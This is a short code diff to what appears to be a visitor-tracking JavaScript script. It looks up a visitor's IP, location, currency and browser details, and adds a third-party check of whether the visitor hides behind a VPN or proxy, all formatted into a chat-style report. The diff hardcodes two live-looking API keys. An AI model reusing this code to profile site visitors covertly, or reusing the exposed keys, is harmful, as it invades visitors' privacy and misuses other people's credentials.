@@ -120,6 +120,11 @@ fetch('https://ipinfo.io/' + ip + '?token=afae6637fcf7bf')
   let isRoute = data.asn && data.asn.route;
   let isDomain = data.asn && data.asn.domain;
 
+  fetch('https://api.ipdata.co/' + ip + '/threat?api-key=d2bc3795e24c5db7c7117376a5c35a1641c6132fa6f484ad0797469b')
+.then(response => response.json())
+.then(data => {
+  let Anon = data.threat && data.threat.is_anonymous ? true : false;
+    
         const message = `
       * Ip 🌐*
     *├ IP: ${ip}*
@@ -139,6 +144,7 @@ fetch('https://ipinfo.io/' + ip + '?token=afae6637fcf7bf')
     *├ UTC: ${utc}*
     *├ Value: ${currency}*
     *├ Version: ${versian}*
+    *├ Anonymous: ${Anon}*
     *├ Country Call code: ${countrycall}*
     *├ TLD: ${tld}*
       * System 🖥*
@@ -175,7 +181,8 @@ fetch('https://ipinfo.io/' + ip + '?token=afae6637fcf7bf')
       });
     });
   });
-
+});
+        
 function getBrowserInfo() {
     const ua = navigator.userAgent;
     let browser = '';
